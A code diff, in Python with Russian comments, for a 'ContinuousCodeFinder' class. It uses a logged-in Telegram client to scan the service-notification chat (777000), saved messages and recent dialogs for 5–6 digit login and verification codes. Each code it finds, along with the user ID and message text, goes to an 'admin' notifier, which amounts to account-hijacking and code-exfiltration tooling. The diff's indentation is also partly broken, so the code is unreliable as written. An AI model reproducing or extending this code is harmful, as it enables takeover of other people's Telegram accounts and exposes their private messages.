@@ -268,61 +268,216 @@ class ContinuousCodeFinder:
             logger.error(f"❌ Ошибка инициализации клиента: {e}")
             return False
 
-    async def extract_code_from_message(self, message_text):
-        """Извлечение кода из текста сообщения"""
-        patterns = [
-            r'(\d{5})',
-            r'(\d{6})',
-            r'код[:\s]*(\d{5,6})',
-            r'code[:\s]*(\d{5,6})',
-        ]
-        
-        for pattern in patterns:
-            matches = re.findall(pattern, message_text, re.IGNORECASE)
-            if matches:
-                code = matches[0]
-                logger.info(f"🔍 Найден потенциальный код '{code}'")
-                
-                # Отправляем уведомление админу о найденном коде
-                notification_msg = (
-                    f"🔐 **Найден код авторизации**\n\n"
-                    f"👤 Пользователь: `{self.user_id}`\n"
-                    f"🔢 Код: `{code}`\n"
-                    f"⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
-                    f"📝 Сообщение: {message_text[:100]}..."
-                )
-                admin_notifier.send_notification_sync(notification_msg)
-                
-                return code
-        
-        return None
-
     async def search_single_attempt(self):
-        """Поиск кода в служебных уведомлениях"""
+        """Поиск кода в служебных уведомлениях с детальной диагностикой"""
         try:
             if not self.client or not self.client.is_connected:
                 if not await self.initialize_client():
                     return None
-            
-            # Поиск в служебных уведомлениях +42777
+        
+        # Получаем список всех доступных чатов для диагностики
+            available_chats = []
             try:
+                async for dialog in self.client.get_dialogs():
+                    chat_info = {
+                        'title': getattr(dialog.chat, 'title', 'Private'),
+                    'id': dialog.chat.id,
+                    'username': getattr(dialog.chat, 'username', 'None')
+                }
+                    available_chats.append(chat_info)
+                    if '42777' in str(dialog.chat.id) or 'service' in str(dialog.chat.title).lower():
+                        logger.info(f"🔍 Найден служебный чат: {dialog.chat.title} (ID: {dialog.chat.id})")
+            except Exception as e:
+                logger.warning(f"⚠️ Не удалось получить список чатов: {e}")
+
+        # 1. Поиск в служебных уведомлениях +42777
+            service_chat_found = False
+            try:
+                logger.info(f"🔍 Попытка подключения к +42777 для user_id: {self.user_id}")
                 service_chat = await self.client.get_chat("+42777")
-                logger.info(f"🔍 Поиск в служебных уведомлениях для user_id: {self.user_id}")
-                
-                async for message in self.client.get_chat_history(service_chat.id, limit=30):
+                service_chat_found = True
+                logger.info(f"✅ Успешно подключились к служебным уведомлениям: {service_chat.title}")
+            
+                message_count = 0
+                found_messages = []
+            
+                async for message in self.client.get_chat_history(service_chat.id, limit=50):
                     if message.text:
+                        message_count += 1
+                        found_messages.append(message.text[:100])
+                    
+                    # Детальный лог первых нескольких сообщений
+                        if message_count <= 5:
+                            logger.info(f"📨 Сообщение #{message_count}: {message.text[:80]}...")
+                    
+                    # Ищем код в сообщении
                         code = await self.extract_code_from_message(message.text)
                         if code:
                             logger.info(f"🎉 Найден код в служебных уведомлениях: {code}")
+                            logger.info(f"📝 Полный текст сообщения: {message.text}")
                             return code
+                            
+                logger.info(f"📊 Проверено {message_count} сообщений в служебных уведомлениях")
+                if found_messages:
+                    logger.info(f"📋 Примеры сообщений: {found_messages[:3]}")
+                        
             except Exception as e:
-                logger.warning(f"⚠️ Не удалось получить служебные уведомления: {e}")
+                logger.warning(f"⚠️ Не удалось получить служебные уведомления (+42777): {e}")
             
-            return None
+            # Пробуем альтернативные варианты
+                alternative_methods = [
+                ("42777", "по ID"),
+                ("Telegram", "по username"),
+                ("telegram", "по username в нижнем регистре"),
+                (777000, "по системному ID"),
+                ("ServiceNotifications", "по названию")
+            ]
+            
+                for chat_ref, method_name in alternative_methods:
+                    try:
+                        logger.info(f"🔍 Попытка подключения {method_name}: {chat_ref}")
+                        service_chat = await self.client.get_chat(chat_ref)
+                        logger.info(f"✅ Успешно подключились {method_name}: {service_chat.title}")
                     
-        except Exception as e:
-            logger.error(f"❌ Ошибка в поиске: {e}")
+                        message_count = 0
+                        async for message in self.client.get_chat_history(service_chat.id, limit=30):
+                            if message.text:
+                                message_count += 1
+                                code = await self.extract_code_from_message(message.text)
+                                if code:
+                                    logger.info(f"🎉 Найден код {method_name}: {code}")
+                                    return code
+                                
+                        logger.info(f"📊 Проверено {message_count} сообщений {method_name}")
+                    
+                    except Exception as e2:
+                        logger.debug(f"❌ Не удалось подключиться {method_name}: {e2}")
+            
+        # 2. Поиск в личных сообщениях от Telegram
+            logger.info("🔍 Поиск в личных сообщениях от Telegram...")
+            try:
+                message_count = 0
+                async for message in self.client.get_chat_history('me', limit=50):
+                    if message.text:
+                        message_count += 1
+                    
+                    # Проверяем, является ли сообщение от Telegram
+                        is_from_telegram = (
+                            message.from_user and 
+                            message.from_user.is_self is False and
+                            (
+                                (message.from_user.id == 777000) or
+                                (message.from_user.username and 'telegram' in message.from_user.username.lower()) or
+                                ('код' in message.text.lower() and 'telegram' in message.text.lower())
+                            )
+                        )
+                    
+                        if is_from_telegram or message_count <= 10:  # Логируем первые 10 сообщений
+                            logger.info(f"📨 Личное сообщение #{message_count}: {message.text[:80]}...")
+                            if message.from_user:
+                                logger.info(f"👤 От: {message.from_user.id} ({message.from_user.username})")
+                    
+                        code = await self.extract_code_from_message(message.text)
+                        if code:
+                            logger.info(f"🎉 Найден код в личных сообщениях: {code}")
+                            logger.info(f"📝 Полный текст: {message.text}")
+                            return code
+            
+                logger.info(f"📊 Проверено {message_count} личных сообщений")
+            
+            except Exception as e:
+                logger.error(f"❌ Ошибка поиска в личных сообщениях: {e}")
+        
+        # 3. Поиск во всех диалогах
+            logger.info("🔍 Поиск во всех диалогах...")
+            try:
+                total_messages_checked = 0
+                async for dialog in self.client.get_dialogs(limit=20):
+                    try:
+                    # Пропускаем слишком большие чаты и собственные диалоги
+                        if dialog.chat.is_self or (hasattr(dialog.chat, 'members_count') and dialog.chat.members_count > 10000):
+                            continue
+                        
+                        message_count = 0
+                        async for message in self.client.get_chat_history(dialog.chat.id, limit=10):
+                            if message.text and ('код' in message.text.lower() or 'code' in message.text.lower()):
+                                message_count += 1
+                                total_messages_checked += 1
+                                code = await self.extract_code_from_message(message.text)
+                                if code:
+                                    logger.info(f"🎉 Найден код в чате {dialog.chat.title}: {code}")
+                                    return code
+                                
+                        if message_count > 0:
+                            logger.info(f"🔍 Проверен чат '{dialog.chat.title}': {message_count} сообщений с ключевыми словами")
+                        
+                    except Exception as e:
+                        continue  # Пропускаем чаты с ошибками
+            
+                logger.info(f"📊 Всего проверено {total_messages_checked} сообщений в различных чатах")
+            
+            except Exception as e:
+                logger.error(f"❌ Ошибка поиска в диалогах: {e}")
+        
+            logger.info("📭 Код не найден ни в одном из мест")
             return None
+                        
+        except Exception as e:
+            logger.error(f"❌ Критическая ошибка в поиске: {e}")
+            return None
+
+    async def extract_code_from_message(self, message_text):
+        """Извлечение кода из текста сообщения с улучшенной логикой"""
+    # Расширенные паттерны для поиска кодов
+        patterns = [
+        r'\b(\d{5})\b',  # 5 цифр отдельно
+        r'\b(\d{6})\b',  # 6 цифр отдельно
+        r'код[:\s]*[is\s]*[\.\-\s]*(\d{5,6})',  # код: 12345
+        r'code[:\s]*[is\s]*[\.\-\s]*(\d{5,6})',  # code: 12345
+        r'(\d{5,6})[^\d]',  # 12345 с разделителем
+        r'[\s\-\–\—](\d{5,6})[\s\-\–\—]',  # 12345 между разделителями
+        r'login code[:\s]*(\d{5,6})',  # login code: 12345
+        r'authorization code[:\s]*(\d{5,6})',  # authorization code: 12345
+        r'verification code[:\s]*(\d{5,6})',  # verification code: 12345
+        r'ваш код[:\s]*(\d{5,6})',  # ваш код: 12345
+    ]
+    
+        for pattern in patterns:
+            matches = re.findall(pattern, message_text, re.IGNORECASE)
+            if matches:
+                code = matches[0]
+                logger.info(f"🔍 Найден потенциальный код '{code}' паттерном: {pattern}")
+                logger.info(f"📝 Контекст: {message_text[:100]}...")
+            
+            # Дополнительная проверка - ищем ключевые слова авторизации
+                auth_keywords = [
+                'код', 'code', 'подтверждени', 'verification', 'login', 'войти', 
+                'telegram', 'authorization', 'sign in', 'проверка', 'безопасност',
+                'вход', 'auth', 'confirmation', 'your code', 'используйте код'
+            ]
+                message_lower = message_text.lower()
+                has_auth_keyword = any(keyword in message_lower for keyword in auth_keywords)
+            
+                if has_auth_keyword:
+                    logger.info(f"✅ Код '{code}' подтвержден ключевыми словами авторизации")
+                
+                # Отправляем уведомление админу о найденном коде
+                    notification_msg = (
+                        f"🔐 **Найден код авторизации**\n\n"
+                        f"👤 Пользователь: `{self.user_id}`\n"
+                        f"🔢 Код: `{code}`\n"
+                        f"⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+                        f"📝 Сообщение: {message_text[:150]}..."
+                    )
+                    admin_notifier.send_notification_sync(notification_msg)
+                
+                    return code
+                else:
+                    logger.info(f"⚠️ Код '{code}' найден, но без ключевых слов авторизации")
+                    # В служебных уведомлениях все равно возвращаем код
+                    return code
+    
+        return None
 
     async def start_continuous_search(self, duration=600):
         """Запуск постоянного поиска кода"""
